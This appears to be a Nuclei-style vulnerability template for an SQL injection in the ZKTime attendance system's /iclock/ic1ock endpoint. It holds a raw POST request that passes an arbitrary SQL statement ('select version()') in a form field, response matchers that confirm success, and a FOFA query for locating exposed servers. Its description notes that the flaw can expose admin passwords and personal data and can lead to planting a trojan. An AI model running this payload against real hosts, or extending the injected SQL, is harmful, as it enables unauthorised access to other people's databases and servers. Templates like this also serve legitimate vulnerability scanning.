http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 执行 select version() 成功
            - 执行 SQL 语句
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /iclock/ic1ock HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          submit=%E6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select version()
id: ZKTime-ic1ock-sql
info:
    author: Superhero
    description: |-
        fofa: body="/media/images/ZKECO16.ico"
        ZKTime 熵基智能考勤管理系统 ic1ock 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: ZKTime 熵基智能考勤管理系统 ic1ock SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/DiyY7pMDnViwMUL8DTHKIg
    severity: high
    tags:
        - ZKTime
